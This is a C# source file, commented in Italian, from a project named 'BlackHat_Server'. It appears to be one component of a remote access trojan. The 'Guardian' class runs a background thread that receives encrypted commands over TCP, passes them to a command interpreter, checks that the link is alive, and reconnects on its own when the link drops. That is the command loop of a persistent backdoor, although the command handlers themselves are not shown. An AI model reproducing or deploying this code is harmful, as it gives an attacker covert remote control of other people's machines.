using System;
using System.Collections.Generic;
using System.Text;
using System.Net.Sockets;

namespace BlackHat_Server
{
    // OGGETTO GUARDIAN ASPETTA UN MESSAGGIO E PASSA IL MESSAGGIO A CMDINTERPRETER
    class Guardian
    {
        

        public Guardian()
        {

        }


        /// <summary>
        /// Avvia Guardiano su nuovo thread
        /// </summary>
        public void StartGuardian()
        {
            System.Threading.Thread t = new System.Threading.Thread(CmdGuardian);
            t.IsBackground = true;
            t.Start();
        }
        //---------------------------------------

       

        /// <summary>
        /// Worker thread Guardian
        /// </summary>
        private void CmdGuardian()
        {
            KeepAlive ka = new KeepAlive();
            MsgManager com = new MsgManager(ST_Client.Instance.Connessione.GetStream());

            while (ST_Client.Instance.isConnected)
            {
                try
                {
                    
                    //string t = ST_Client.Instance.Connessione.Client.RemoteEndPoint.ToString();

                    // ASPETTO PER 60 SECONDI UN MESSAGGIO 
                    // OGNI 90 SU CLIENT!
                    string cmd = com.WaitForEncryMessageRicorsive(60000);

                    if (cmd != "TIMEOUT")
                    {
                        CmdInterpreter cmdit = new CmdInterpreter();
                        cmdit.Interpreter(cmd);
                    }

                    // SE LA CONNESSIONE DEL SERVER NON P STATA CHIUSA MANUALMENTE CONTROLLO IS ALIVE
                    if (ST_Client.Instance.isConnected)
                        ST_Client.Instance.isConnected = ka.isAlivemMessageMode();

                }
                catch (InvalidOperationException)
                {
                    break;
                }
               
                
            }

            CloseAndReconnect();
                        
        }
        //---------------------------------------

        /// <summary>
        /// Chiude la connessione e ne crea una nuova
        /// </summary>
        public void CloseAndReconnect()
        {
            // NON SONO PIù CONNESSO RILANCIO STARSERVER            
            ST_Client.Instance.Connessione.Close();

            ST_Client.Instance.CloseAllChannels();

            ST_Client.Instance.Connessione = new TcpClient();
            Connection con = new Connection();
            con.StartServer();
        }


    }
}
